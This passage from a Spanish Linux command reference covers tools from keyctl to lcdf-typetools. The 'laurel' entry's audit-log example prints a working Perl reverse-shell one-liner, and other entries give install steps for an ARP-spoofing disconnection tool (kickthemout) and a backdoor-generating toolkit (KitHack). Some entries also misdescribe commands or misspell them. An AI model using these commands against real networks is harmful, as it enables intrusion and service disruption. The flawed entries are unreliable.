Este comando intentará usar kexec para reiniciar. Si la distribución y configuración lo soportan, systemd se encargará de cargar el kernel y el initrd apropiados, y luego invocará kexec -e como parte de la secuencia de apagado. Esto proporciona un reinicio "limpio" donde todos los servicios se apagan correctamente antes de que el nuevo kernel tome el control.


keyctl
[keyutils]. Este programa se utiliza para controlar la instalación de administración de claves de varias maneras usando una variedad de subcomandos.
$ keyctl list @us (Enumerar las claves actuales en la sesión predeterminada del usuario)
$ keyctl show
$ keyctl read 898972716 (Leer una clave de la salida anterior y formatearla en hexadecimal si no se puede imprimir)
$ keuctl pipe 898972716 (Leer una clave y formatearla tal como está)
$ keyctl session
$ keyctl (muestra la gran variedad de subcomandos que pueden emplearse)


keyman
[onboard]. Sistema de entrada de teclado multilingüe y multiplataforma que permite escribir fácilmente en más de 2000 idiomas, incluyendo lenguas con alfabetos especiales, escrituras complejas o sistemas que normalmente no están soportados por los teclados estándar como el Tibetano, Hindi, Amhárico, Cherokee, etc. No cambia el idioma del sistema, sino el comportamiento del teclado. Se puede buscar y descargar un teclado en la web oficial https://keyman.com/keyboards.
$ keyman install ~/Descargas/tamil99.kmp (instalar un teclado tamil)
$ keyman list (muestra teclados instalados)
$ keyman list --short (saber la ID para usar en scripts)
$ keyman apply tamil99 (activa el teclado llamado "tamil99")
Una vez aplicado se podrá escribir en cualquier aplicación [LibreOffice, Firefox, etc.] con el nuevo mapa de teclado activo
$ keyman stop (dejar de usar)


khal
Programa de calendario basado en estándares abiertos y capaz de sincronizarse con servidores CalDAV a través de vdirsyncer.
$ khal configure (guiará por un asistente para definir calendarios y formatos de visualización necesario antes de usar)
$ khal list (muestra los eventos del día actual)
$ khal list today 7d (lista los eventos de los próximos 7 días)
$ khal new 2025-02-10 10:00 1h "Reunión con equipo" (crea un evento el 10 de febrero de 2025 a las 10:00 AM con una duración de 1 hora)
$ khal calendar (muestra un calendario mensual con eventos resaltados)
$ khal delete "Reunión con equipo" (borra el evento con el título especificado)
$ khal search "cumpleaños" (buscar eventos)
1.-
Sincronizar con CalDAV si se configuró mediante vdirsyncer
$ vdirsyncer sync
$ khal sync (actualizar para reflejar los cambios)


kickpass
Forma simple de crear contraseñas seguras
# kickpass init (inicia un nuevo directorio seguro de contraseña. Predeterminado a ~/.kickpass)
# kickpass create palabra (Crea una nueva contraseña segura)
# kickpass open palabra (Abrir una contraseña segura e imprimir su contenido en stdout)
# kickpass list (lista contraseñas disponibles)
# kickpass delete palabra (Eliminar contraseña)
# kickpass rename antiga nueva (Cambiar el nombre de una contraseña)


kickthemout
[nmap]. Herramienta que usa el envenenamiento ARP o ARP Spoofing que mata la conectividad a Internet del o los dispositivos conectados a una red de área local, siempre que la configuración de seguridad de la red no impida dichos ataques.
Descarga y requerimientos:
$ git clone https://github.com/k4m4/kickthemout.git
$ cd kickthemout/
$ sudo -H python -m pip install -r requirements.txt
$ sudo python kickthemout.py
Al lanzar la aplicación:
# python kickthemout.py
Muestra 3 posibilidades, matar uno, varios o todos los dispositivos y el bloqueo dura mientras el comando está en ejecución por tanto el bloqueo es temporal.


kill
Enviar señales a los procesos.
$ kill -l	    (lista todas las señales que pueden mandarse a un proceso)
$ kill -0             (mata todos los procesos de la shell)
$ kill -9  pid      (mata el proceso indicado con el número PID)
# kill -9 `lsof -t -i :22` (Mata el proceso que corre en el puerto 22)
$ kill -1 pid  (reinicia el servicio indicado en PID)
$ kill %2 (mata el proceso número 2)
$ kill -19 pid  (Parar un proceso de forma temporal. Con -18 se reanuda)
Algunas muestras del número y su equivalencia:
1 (SIGHUP) --> Colgar sesión o recargar configuración. Muchos demonios lo usan para recargar sin reiniciar, como  nginx, sshd, rsyslog...
2 (SIGINT) --> Interrumpe el proceso desde terminal. Equivalente a Ctrl-c
3 (SIGQUIT)--> Termina proceso y genera un volcado [core dump]. Equivalente a Ctrl+\
9 (SIGKILL)--> Mata el proceso inmediatamente, sin posibilidad de captura ni limpieza
10(SIGUSR1)--> Señal libre para uso personal por programas o scripts
11(SIGSEGV)--> Error de memoria [acceso indebido]
12(SIGUSR2)--> Señal libre para uso personal por porgramas o scripts
13(SIGPIPE)--> Cuando un proceso escribe en una tubería sin lector
14(SIGALRM)--> Señal enviada por temporizadores [alarm(), sleep]
15(SIGTERM)--> Cierre ordenado
17(SIGCHLD)--> Notifica a un proceso padre que su hijo terminó
18(SIGCONT)--> Reanudar un proceso pausado
19(SIGSTOP)--> Pausa el proceso
20(SIGTSTP)--> Terminal Stop. Equivalente a (Ctrl+z)
Nota.- Si en vez de usar los números [kill -9 pid] usamos el nombre de la señal [kill -KILL pid] podemos omitir las letras SIG de la señal [SIGKILL]


killall
Mata el proceso de la aplicación especificada
$ killall -9 scribus
$ killall gnome-panel (reiniciar los paneles)
$ killall -INFO dd (chequear el estado de un proceso dd)
$ killall -u usuario (Matar los procesos de un usuario)
$ killall -l (listado de todas las señales)
$ killall -s SEGV


killer
Elimina los trabajos en segundo plano. Cuando se instala un trabajo cron se encarga de ejecutar Killer una vez por hora.
$ killer (forma básica)
$ killer -d -n (activar debug en la salida y sin matar los procesos, solo imprimiendo el resultado)


kippo
[python-foolscap pycrypto python2-zope-interface twisted python2-pyopenssl python-foolscap python2-pyasn1]. Construir un honeypot por ssh.
Descargar y desenpaquetar kippo:
$ wget https://kippo.googlecode.com/files/kippo-0.5.tar.gz
$ tar xzf kippo-0.5.tar.gz
$ cd kippo-0.5
$ ./start.sh
Configuración de iptables:
# iptables -A INPUT -i eth0 -p tcp --dport 22 -j ACCEPT
# iptables -A INPUT -i eth0 -p tcp --dport 2222 -j ACCEPT
# iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 22 -j REDIRECT --to-port 2222
Los intentos de acceso ssh quedan registrados en el subdirectorio log:
$ cd kippo-0.5/log
$ tail -f kippo.log


kismet
Identifica redes inalambricas de forma pasiva recolectando paquetes, detecta redes ocultas, clientes asociados y es capaz de sniffar el tráfico de las redes no encriptadas.
# nano /etc/kismet/kismet.conf
Buscar la linea:  source=none,none,addme
Y sustituirla por:  source=ath5k,eth1,wifi
en la que “ath5k” es el driver que usamos, “eth1” la interfaz de red y “wifi” cualquier nombre.
También en este archivo pueden configurarse otros parámetros (Puerto, host permitido, máximo de clientes, logs...) :
	tcpport=2501
	allowedhosts=127.0.0.1
	maxclients=5
	logtemplate=/var/log/kismet/
En el directorio de logs, los archivos que interesan son los .pcap que pueden visionarse con wireshark.
# kismet   (lanzar la aplicación)


kithack
[python2.7 python-pip]. Es un proyecto de código abierto que contiene 130 herramientas enfocadas al hacking y automatiza el proceso de descarga e instalación para la herramienta que usted desee. KitHack también nos brinda la facilidad de poder generar puertas traseras con diferentes tipos de Payloads tanto para Linux, Windows, Android y MAC OS.
Instalación:
$ git clone https://github.com/AdrMXR/KitHack.git
$ cd KitHack
$ ./install.sh
# python KitHack.py


kitty
Emulador de terminal.
Algunas combinaciones de teclas:
    C+S+t --> Crear una pestaña nueva.
    C+S+q --> Cerrar una pestaña.
    C+S+→ --> Pestaña siguiente.
    C+S+← --> Pesstaña anterior.
    C+S+. --> Mover a la derecha la pestaña.
    C+S+, --> Mover a la izquierda la pestaña.
    C+S+enter --> Nueva ventana.
    C+S+n --> Crear marco nuevo.
    C+S+1 --> Mover foco a la ventana 1 (2,3,...)
    C+S+l --> Cambiar la distribución de las ventanas
La distribución de ventanas puede ser:
    Fat: Ventana arriba ocupando todo el ancho y las demás abajo una al lado de la otra.
    Grid: Todas las ventanas en una rejilla repartiendo el espacio entre todas.
    Horizontal: Todas las ventanas unas al lado de las otras.
    Stack: Las ventanas ocupando todo el marco.
    Tall: Ventana en la izquierda ocupando todo el alto y el resto a la derecha una encima de otra.
    Vertical: Ventanas todas apiladas unas encima de otras.
Muestra de archivo de configuración:
$ nano ~/.config/kitty/kitty.conf
       font_family      monospace
       font_size        12
       enable_audio_bell no
       shell bash
       remember_window_size    yes
       #initial_window_width  640
       #initial_window_height 400
       remember_window_position no
       hide_window_decorations yes


kmod
Mostrar módulos del kernel.
# kmod list


knockd
El port knocking o golpeo de puertos es un mecanismo mediante la cual el cortafuegos, que mantiene cerrado un determinado puerto, detecta una secuencia preestablecida que procede de una conexión externa y abre dicho puerto para que el servicio asignado sea accesible. Este mecanismo permite añadir una capa adicional de seguridad [por oscuridad], de manera que para cualquier conexión externa no autorizada los puertos donde se brindan los servicios se muestran como cerrados, eliminando así la posibilidad de intentar la conexión y no ofreciendo información sobre el servicio configurado. Por su parte, el usuario autorizado necesita disponer de un cliente de port-knocking que envíe una secuencia de paquetes dirigidos a dicho puerto, con el fin de que el cortafuegos detecte la secuencia correcta y abra el puerto dejando accesible el servicio. Una vez desactivada esta capa de seguridad, el servicio está accesible para realizar ls conexión [por ejemplo SSH]. La aplicación precisa estar instalada en el servidor y en el cliente.
Habilitar el servicio y especificar la red:
# nano /etc/default/knockd
	START_KNOCKD=1
	KNOCKD_OPTS="-i eth0"
Configurar las opciones de loging y las secuencias que queremos usar:
# nano /etc/knockd.conf
	[options]
	        UseSyslog
	[openSSH]
	        sequence    = 7000,8000,9000
	        seq_timeout = 5
	        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	        tcpflags    = syn
	[closeSSH]
	        sequence    = 9000,8000,7000
	        seq_timeout = 5
	        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	        tcpflags    = syn
* UseSyslog (que envía los logs a /var/log/syslog. Si se desea un fichero de log propio, se utiliza LogFile=/var/log/knockd.log)
* sequence (especifica la secuencia de puertos y tipo de paquete a enviar para hacer el portknocking (por defecto TCP, pero se puede especificar una secuencia más compleja como sequence=2140:udp,4500:tcp,3025:udp)
* seq_timeout (especifica el periodo máximo de tiempo en segundos en el que la secuencia completa es recibida como secuencia válida)
* tcpflags (especifica los flags que deben ser tenidos en cuenta (fin|syn|rst|psh|ack|urg).
* command (especifica el comando a ejecutar cuando se reconoce la secuencia definida)
* %IP% (toma del valor de la ip cliente desde la que se envía la secuencia de puertos)
Con esta configuración, el servidor knockd escucha permanentemente todos los puertos, esperando una secuencia válida. Si recibe paquetes TCP dirigidos a los puertos 7000, 8000 y 9000, en este mismo orden y dentro de un intervalo de 5 segundos, reconoce la directiva [openSSH] y ejecuta iptables para abrir el puerto 22 [donde escucha sshd] a la IP que solicita la conexión. Ahora el cliente SSH puede realizar la conexión, y podemos cerrar el puerto de nuevo con la directiva [closeSSH] manteniendo establecida dicha conexión.
# service knockd start (Iniciar el servicio)
Probar el servicio en local:
Parar knockd si está activo y levantarlo manualmente:
# service knockd stop
# knockd -v -i lo
En otra terminal:
$ knock -v localhost 7000 8000 9000
Cuando queramos terminar la conexión:
$ knock -v localhost 9000 8000 7000
En la terminal del servidor veremos algo como:
# knockd -v -i lo
	listening on lo...
	127.0.0.1: openSSH: Stage 1
	127.0.0.1: openSSH: Stage 2
	127.0.0.1: openSSH: Stage 3
	127.0.0.1: openSSH: OPEN SESAME
	openSSH: running command: /sbin/iptables -A INPUT -s 127.0.0.1 -p tcp --dport 22 -j ACCEPT
	127.0.0.1: closeSSH: Stage 1
	127.0.0.1: closeSSH: Stage 2
	127.0.0.1: closeSSH: Stage 3
	127.0.0.1: closeSSH: OPEN SESAME
	closeSSH: running command: /sbin/iptables -D INPUT -s 127.0.0.1 -p tcp --dport 22 -j ACCEPT
Si en la configuración de iptables tenemos acceso a conexiones ya establecidas:
	iptables -A INPUT -p tcp -m tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
Podemos configurar la aplicación para que se cierre de forma automática:
# nano /etc/knockd.conf
	[opencloseSSH]
	        sequence = 7000,8000,9000
	        seq_timeout = 5
	        tcpflags = syn
	        start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	        cmd_timeout = 25
	        stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp  --dport 22 -j ACCEPT


knocker
Para detectar sistemas operativos y revisar puertos de servidores remotos.
# knocker -H IP_o_host -SP 1 -EP 1024
-SP (Indica el puerto de inicio del escaneo)
-EP (Indica el puerto final)


komichi
Navegador minimalista escrito en python y pyqt4 con soporte para pestañas, flash y atajos de teclado. Descarga de http://es.sourceforge.jp/projects/sfnet_komichi/releases/
Algunos atajos:
Ctrl + t (Nueva pestaña)
Ctrl + b (Marcadores)
Alt + p (Configuracion [pagina de inicio, javascript, plugins...])
F1 (Abrir archivo README)
Ctrl + Mayus + t (Abrir ultima pestaña cerrada)
F5 (Recargar pagina)
Ctrl + o (Abrir)
Ctrl + k (Buscar)
Ctrl + l (Entrar url)
Ctrl + s (Guardar la pagina)
Ctrl + f (Buscar en la pagina)
Ctrl + g (siguiente entrada de la busqueda)
Ctrl + + (Aumentar zoom)
Ctrl + - (Disminuir zoom)
Ctrl+ 0 (Visualizacion por defecto)
Ctrl + h (History)
Ctrl + Mayus + del (Borrar history)
Ctrl + Mayus + n (Entrar en modo privado)
Ctrl + d (Entrar pagina en los marcadores)


kpsewhich
Herramienta utilizada en sistemas TeX [como LaTeX] para localizar archivos específicos, como una clase [.cls] o un paquete [.sty] dentro del árbol de directorios de TeX y expandir rutas de manera independiente en el sistema.
$ kpsewhich beamercolorthemefly.sty (devolverá la ruta completa al archivo especificado en el sistema)
$ kpsewhich cmr10.tfm (encontrará el archivo cmr10.tfm, que pertenece a la familia Computer Modern Roman)
$ kpsewhich --expand-var '$TEXMF' (mostrará el valor expandido de la variable $TEXMF, que apunta al directorio principal de archivos de TeX)
$ kpsewhich texmf.cnf (devuelve la ubicación del archivo de configuración texmf.cnf que contiene variables y rutas)
$ kpsewhich example.pdf (ver dónde se ha generado un archivo de salida [como un .pdf o .log])
$ kpsewhich --format='TeX system documentation' file.txt (limitar la búsqueda a tipos específicos de archivos. Por ejemplo, para buscar solo archivos de ayuda [.doc o .txt])


ksh
Intérprete interactivo de comandos UNIX y lenguaje de script compatible con POSIX. Antes, el paquete del Korn Shell se llamaba simplemente ksh, ahora, por cuestiones de licencias y mantenimiento, Debian usa la versión moderna mantenida como ksh93u+m [ver].
$ ksh (estando en bash pasa ksh)


ksh93u+m
Intérprete interactivo de comandos UNIX y lenguaje de script compatible con POSIX. Es un superconjunto de sh, el shell de UNIX System V. Debian, en vez de seguir llamándola simplemente ksh, prefirió usar el nombre exacto de la versión upstream para evitar confusiones y conflictos futuros.
$ ksh93 (estando en bash pasa a ksh)
$ ksh (lo mismo aunque el paquete "ksh" esté desinstalado)


kshell5
[kinit]. Es un envoltorio [wrapper] o herramienta auxiliar para ejecutar comandos en un entorno Kerberizado. Kerberos es un protocolo de autenticación de red que proporciona una autenticación segura para aplicaciones cliente/servidor mediante criptografía de clave secreta.
Por ejemplo un servidor de archivos, NFS por ejemplo, que está protegido con Kerberos. Para montar ese recurso, el cliente necesita autenticarse.
$ kinit tu_usuario@REALM.EJEMPLO.COM (obtener el ticket Kerberos. Pedirá contraseña)
$ kshell5 mount -t nfs server.ejemplo.com:/ruta /mnt/data (montar el server)
kshell5 se asegura de que el comando mount se ejecute en un entorno donde las credenciales Kerberos son accesibles y se utilizan para la autenticación con el servidor NFS.


kvm-ok
[check-bios-nx]. Comprobar si la CPU  tiene soporte para extensiones KVM.
# kvm-ok
INFO: Your CPU does not support KVM extensions
KVM acceleration can NOT be used


kwin
[kde-window-manager]. Gestor de ventanas
$ kwin --replace (Activar kwin)


l2tpns
[Layer 2 Tunneling Protocol Network Server]. Servidor de red de protocolo de tunelización de capa 2 [LNS] diseñado para manejar grandes volúmenes de conexiones VPN [admite hasta 65535 sesiones], además de funciones como limitación de velocidad, contabilidad de uso y agrupación en clústeres tanto para compartir carga como para redundancia.
Ejemplo de archivo de configuración.
# nano /etc/l2tpns/l2tpns.conf
        # Configuración básica del servidor
        listen = 0.0.0.0
        port = 1701
        #
        # Configuración de autenticación
        auth {
            type = radius
            server = 192.168.1.10
            secret = miSecretoCompartido
            timeout = 3
        }
        #
        # Configuración de IPs para clientes
        ip {
            pool = 192.168.100.100-192.168.100.200
            dns = 8.8.8.8, 8.8.4.4
        }
        #
        # Limitación de ancho de banda
        shaper {
            default = 1024/512  # 1024 kbps down / 512 kbps up
            premium_users = 2048/1024
            user.juan = 512/256  # Limitación específica para usuario 'juan'
        }
        # Configuración de cluster (para alta disponibilidad)
        cluster {
            nodes = 192.168.1.101, 192.168.1.102
            secret = ClusterSecret123
            heartbeat_interval = 5
        }
$ l2tpns -c /etc/l2tpns/l2tpns.conf (iniciar el servidor)
$ l2tpns -d -c /etc/l2tpns/l2tpns.conf (iniciar en modo depuración)
# iptables -A INPUT -p udp --dport 1701 -j ACCEPT (abrir el puerto correpondiente en el Firewall)
Incluye una interfaz administrativa, usualmente en el puerto 4000, donde están disponibles comandos de administración
$ telnet localhost 4000
        > show users --> Lista usuarios conectados
        > show stats --> Muestra estadísticas del servidor
        > kill session <id> --> Termina una sesión específica
        > reload --> Recarga la configuración sin reiniciar
$ l2tpns-accounting -f /var/log/l2tpns/accounting.log -r mensual (generar reportes de uso)


lablie
[LABel LIne Editor]. Herramienta CLI para generar etiquetas imprimibles a partir de plantillas SVG. Los documentos se pueden generar a partir de imágenes SVG o plantillas SVG con datos de instancias.
Ejemplo completo de suo
$ nano etiqueta.svg
Equipo: {nombre}
Código: {codigo}
$ nano datos.yaml
- nombre: Placa 1
  codigo: A123
- nombre: Placa 2
  codigo: B456
$ lablie render etiqueta.svg datos.yaml --output-dir etiquetas/ (creará archivos SVG como: etiquetas/Placa 1.svg, etiquetas/Placa 2.svg)


lame
Cambiar formatos de audio
$ lame entrada.wav salida.mp3 (forma básica de pasar de .wwav a .mp3)
$ lame -h -m j tema.wav tema.mp3  (otra forma de pasar de .wav a .mp3)
$ lame -h -m j --nogap *.wav (pasar lote de wav a mp3)
$ lame -h --decode tema.mp3 tema.wav (pasar de mp3 a wav)
$ for i in *.mp3; do lame -q 0 -b 160 -m j "$i" "directorio/$i"; done (Modificar el bitrate (-b 160) de todos los mp3 de “directorio”)
-q 0	Opciones de 0 a 9. A menor calidad, mayor velocidad de conversión.
-m j	Activar joint stereo.


laptop-detect
Detecta si nos encontramos en un portatil. Retorna "0" si lo más probable es que si, "1" si probablemente es que no y "2" si es una opción desconocida.
$ laptot-detect -v


largetifftools
Conjunto de software que puede ayudar a gestionar archivos TIFF muy grandes, especialmente archivos demasiado grandes para caber completamente en la memoria RAM del ordenador. Es particularmente útil para trabajar con imágenes de alta resolución, como las generadas por escáneres científicos, cámaras de gran formato o drones. Incluye las herramientas tifffastcrop, tiffmakemosaic y tiffsplittiles
$ tifffastcrop entrada.tif salida.tif 1000 2000 5000 3000 (recortar una sección específica que comienza en las coordenadas [x=1000, y=2000] y tiene un tamaño de 5000x3000 píxeles)
$ tiffmakemosaic mapa_area_completa.tif parte1.tif 0 0 parte2.tif 1000 0 parte3.tif 0 500 parte4.tif 1000 500 (unir varias capturas en una sola imagen. parte2.tif está a la derecha de parte1.tif, y parte3.tif y parte4.tif están debajo de las dos primeras respectivamente)
$ tiffmakemosaic documento_completo.tif documento_arriba.tif 0 0 documento_abajo.tif 0 2000 (documento_abajo.tif comienza en la coordenada Y=2000, justo debajo de documento_arriba.tif)
$ tiffsplittiles imagen_aerea.tif 1024 1024 tile_aerea (dividir imagen_aerea.tif en trozos de 1024x1024 píxeles generaría y archivos como tile_aerea_0_0.tif, tile_aerea_0_1.tif...)
$ tiffsplittiles mapa_historico.tif 256 256 mapa_tile (dividir mapa_historico.tif en tiles de 256x256)


last
[lastlog2]. Muestra la ultima vez que se conecto un usuario [/var/log/wtmp].
$ last -n 10 (Muestra los últimos 10 eventos. )
$ last reboot (la útima vez que se reinició)
$ last -i (Mostrando la ip)
$ last tty1 (que lo hizo a la tty1)
$ last usuario (que se conectó “usuario”)
$ last -f /media/sda2/var/log/wtmp (Analizar el acceso de otro sistema)


lastb
Muestra los intentos de conexión fallidos (/var/log/btmp)
# lastb   -20 (Muestra los últimos 20 intentos fallidos en logearse)


lastcomm
[acct)]. Muestra información acerca de comandos ejecutados y terminales abiertas.
$ lastcomm tmux tty1 (sólo muestra los epecificados)
$ lastcomm root (Del usuario root)


lastlog
Ver el momento exacto que los usuarios han entrado por última vez
$ lastlog -u usuario  (solo ver a "usuario")


lastpass
Interfaz de línea de comandos para los servicios de LastPass.com un popular gestor de contraseñas que almacena las credenciales de forma segura en una bóveda cifrada en la nube.. Ejemplos en file:///usr/share/doc/lastpass-cli/examples
$ lpass login usuario@gmail.com (despues de crear la cuenta en laspass.com, iniciar sesión en la cuenta de lastpass.com)
$ lpass ls (listar entradas)
$ lpass show -c --password Sitename (guardar la contraseña de Sitename en el búfer de copia)
$ lpass show (almacenar contraseñas utilizadas en scripts, en lugar de escribirlas en los propios scripts)
$ lpass ls --sync=auto -l --color=auto folder (sincronizar, forma extendida, en color y del apartado "folder" de los datos en la web)
$ lpass ls folder
$ lpass show --sync=auto --all --color=auto USER (todos los datos del usuario USER)
$ lpass show --sync=auto --password --color=auto USER (solo mostrar la contraseña)
$ lpass logout -f --color=auto (salir)
$ lpass generate --sync=auto -c --username=USER@gmail.com USER 16 (crear contraseña de 16 caracteres y copiarla al portapapeles. No se muestra en pantalla y se guarda unos segundos)


latencytop
Herramienta diseñada para identificar dónde se produce la latencia en el sistema y qué tipo de operación/acción la causa. El kernel debe tener soporte para CONFIG_LATENCYTOP.
# zcat /proc/config.gz | grep CONFIG_LATENCYTOP (comprobar si está activado en el sistema)
# latencytop (comando básico)
Muestra algunas columnas: Cause of latency [Nombre técnico del punto de bloqueo o llamada que causa la espera], Count [Cuántas veces ha ocurrido esa causa desde que se lanzó latencytop], Maximum [Máxima duración de una única latencia por esa causa], Total [Tiempo total acumulado de latencia causado por esa operación] y Description [Explicación más legible para humanos]
Teclas útiles dentro de latencytop
        P --> Mostrar latencias agrupadas por proceso
        K --> Mostrar latencias del núcleo (kernel)
        U --> Mostrar latencias del espacio de usuario
        Q --> Salir
        R --> Reiniciar los contadores


latex
[texlive texlive-lang-spanish]. Sistema de composición de textos, orientado especialmente a la creación de libros, documentos científicos y técnicos que contengan fórmulas matemáticas. La elaboración del documento requiere normalmente de dos etapas: en la primera hay que crear mediante cualquier editor de texto llano un fichero fuente que, con las órdenes y comandos adecuados, contenga el texto que queramos imprimir. La segunda consiste en procesar este fichero; el procesador de textos interpreta las órdenes escritas en él y compila el documento, dejándolo preparado para que pueda ser enviado a la salida correspondiente. LaTeX ofrece siempre la misma salida, con independencia del dispositivo (impresora, pantalla, etc.) o el sistema operativo (MS Windows, MacOS, Unix, GNU/Linux, etc.) y puede ser exportado a partir de una misma fuente a numerosos formatos [Ps, PDF, SGML, HTML, RTF, etc.]. Otra ventaja de LaTeX es que calcula la cantidad óptima de caracteres por línea para optimizar la lectura, 66 por defecto. Existen miles de instrucciones. Aquí una pequeña muestra para no morir en el intento.
A continuación una estructura elemental de un documento:
Los comentarios van precedidos por el signo de porcentaje [%]
La primera linea puede especificar el papel [A4], tamaño de la letra [10pt, 11pt, 12pt], tipo de texto [article, report, book, letter, slides...], cantidad de columnas [twocolumn]:
	\documentclass[a4paper, 12pt]{article}
	\documentclass[12pt,twocolumn]{report}
Activar el soporte Unicode [para  dieresis, eñes...]
	\usepackage[utf8]{inputenc}
	\usepackage[spanish]{babel}
Especificar título, autor, fecha. "date", si no se especifica, pone la fecha actual:
	\title{Lorem Ipsum}
	\author{La Pipa Plena}
	\date{ }
El cuerpo del documento se inicia con \maketitle
Inicio y final de texto. Entre párrafos ha de dejarse una linea en blanco. El primer párrafo de una subsección, sección o capítulo no está sangrado, pero los restantes sí.:
	\begin{document}
	Est et quia non voluptatum. Aspernatur facilis excepturi aut. Voluptatem perspiciatis id cum ab nostrum. Qui rerum nisi vitae quae. Quam consequatur eaque minima ipsum distinctio.
	\end{document}
Secciones y subsecciones del texto:
	\section{Introducción}
	\section{Historia}
	\subsection{Historia inicios}
	\subsection{Historia continuación}
Formatos de texto:
	\textbf{texto en negrita}
	\emph{destaca el texto}
	\textit{texto en cursiva}
	\underline{texto subrayado}
	\textsc{texto en versalita}
Tamaño de la letra. Estos comandos afectan a todo el texto que les sigue mientras no se modifique nuevamente y sin necesidad de encerrarlo entre llaves. De más pequeña a más grande: tiny, scriptsize, footnotesize, small, normalsize (la normal), large, Large, LARGE, huge, Huge
Centrar un párrafo:
	\begin{center}
	Est et quia non voluptatum. Aspernatur facilis excepturi aut. Voluptatem perspiciatis id cum ab nostrum. Qui rerum nisi vitae quae. Quam consequatur eaque minima ipsum distinctio.
	\end{center}
alinear texto:
	\centering {Texto a centrar}
	\raggedleft {Texto a la derecha}
	\raggedright {Texto a la izquierda}
Colocar código:
	\begin{verbatim}
	trozo de código
	\end{verbatim}
Para confeccionar un documento en latex puede usarse cualquier editor [vim, nano, gedit...] y para convertirlo a pdf compilarlo con:
$ pdflatex texto.tex
Tambien podemos visualizar directamente el .dvi con la aplicación evince o usar gummi que, al tener la pantalla dividida en dos partes, permite crear el documento y visualizarlo en tiempo real.


latex2html
Covierte un archivo latex a formato html. Crea un directorio con el mismo nombre del archivo.
$ latex2html archivo.tex
$ latex2html -dir DIR archivo.tex (Creará los archivos html en el directorio especificado [tiene que existir])
$ latex2html -html_version 4.0,latin1,unicode archivo.tex (Para que respecte acentos)


laurel
[Linux Audit Usable, Robust, Easy Logging]. Complemento de postprocesamiento para auditd, el sistema de auditoría de Linux, diseñado para transformar los registros de auditoría generados por auditd en un formato más adecuado para su uso en sistemas SIEM [Security Information and Event Management]. En lugar de reemplazar auditd, LAUREL actúa como un plugin que utiliza la interfaz audisp [audit dispatch] para recibir eventos de auditoría, procesarlos y generar registros en un formato basado en JSON, más legible y estructurado para análisis a gran escala en entornos de monitorización de seguridad
Configurar audisp para enviar eventos a LAUREL
# nano /etc/audisp/plugins.d/laurel.conf (crear o modificar el archivo)
        active = yes
        direction = out
        path = /usr/local/bin/laurel
        type = always
        args = --config /etc/laurel/config.toml
        format = string
Configurar LAUREL creando o modificando el archivo:
# mkdir /etc/laurel
# nano /etc/laurel/config.toml
        output = "/var/log/laurel/audit.jsonl"
        labels = [
            { key = "software_mgmt", propagate = true }
        ]
output --> Define la ruta del archivo de salida donde se escribirán los registros JSON.
labels --> Permite asociar etiquetas a procesos para filtrar eventos, por ejemplo, marcar eventos relacionados con la gestión de software).
# systemctl restart auditd (reiniciar auditd para aplicar los cambios)
Una vez configurado, LAUREL procesa automáticamente los eventos de auditd y genera registros en formato JSON en el archivo especificado [/var/log/laurel/audit.jsonl] donde se puede inspeccionar los registros para analizar eventos de seguridad.
Como ejemplo, sin LAUREL un registro de auditd podría verse así
        type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742…
Con LAUREL, el mismo evento se transforma en un registro JSON legible:
        {
          "EXECVE": {
            "argc": 3,
            "ARGV": [
              "perl",
              "-e",
              "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"
            ]
          },
          "PARENT_INFO": {
            "ID": "1643635026.276:327308",
            "comm": "sh",
            "exe": "/usr/bin/dash",
            "ppid": 3190631
          }
        }
Este formato es mucho más claro para un analista de SIEM, mostrando los argumentos del comando sin codificación hexadecimal y proporcionando información sobre el proceso padre.


lavacli
Herramienta para interactuar con LAVA [LAVA Automated Validation Architecture], un sistema de integración continua diseñado específicamente para la implementación de sistemas operativos y la ejecución de pruebas en hardware físico y virtual. Requiere una cuenta de usuario en la instancia para crear y usar tokens de autenticación en algunas llamadas [~/.config/lavacli.yaml].
$ lavacli devices list (mostrar lista de dispositivos de prueba registrados en el servidor LAVA, junto con su estado actual)
$ lavacli devices show beaglebone-black-01 (proporcionará información detallada sobre el hardware, su configuración, y si está disponible para nuevas pruebas)
$ lavacli submit my_job.yaml (enviar un trabajo de prueba [se necesita un archivo YAML que lo defina])
$ lavacli jobs list (ver el estado de los trabajos que están en curso o que han finalizado)
$ lavacli jobs show ID (ver los logs de un trabajo específico con su ID)
$ lavacli utils logs print --job ID (ver logs detallados)
$ lavacli utils logs print --job ID --filter target,input (filtrar logs para ver solo la salida serial del dispositivo y los comandos enviados)
$ lavacli devices maintenance <hostname_del_dispositivo> (poner un dispositivo en mantenimiento)
$ lavacli events listen (ver transmisión en tiempo real de lo que ocurre en el servidor LAVA: inicio de nuevos trabajos, cambios en el estado de los dispositivos, etc)


lazygal
Generar una galería web.
$ lazygal directorio_con_las_imagenes  (Creará todos los archivos en el presente directorio por lo que es preferible estar en un directorio vacio)
$ lazygal -o /var/www/ /home/usuario/fotos (Lo creará en la carpeta web a partir del directorio fotos)


lbzip2
Herramienta de compresión y descompresión compatible con el formato bzip2, que aprovecha múltiples núcleos de CPU para acelerar el proceso. Esto la hace especialmente útil para comprimir o descomprimir archivos grandes en sistemas con procesadores multinúcleo, donde bzip2 tradicional solo usa un núcleo.
$ lbzip2 archivo.txt (reemplaza archivo.txt por archivo.txt.bz2)
$ lbzip2 -d archivo.txt.bz2 (descomprime el archivo y restaura el original)
$ lbzip2 -k archivo.txt (comprimir y mantener el archivo original)
$ lbzip2 -d archivo1.bz2 archivo2.bz2 (descomprime ambos archivos en paralelo)
$ lbzip2 -n 4 archivo.txt (comprimir usando un número específico de núcleos [4])


lcdf-typetools
Herramientas para manipular fuentes OpenType, multimaster y PostScript Type 1. Incluye las herramientas cfftot1, mmafm, mmpfb, otfinfo, otftotfm, t1dotlessj, t1lint, t1rawafm, t1reencode, t1testpage y ttftotype42.
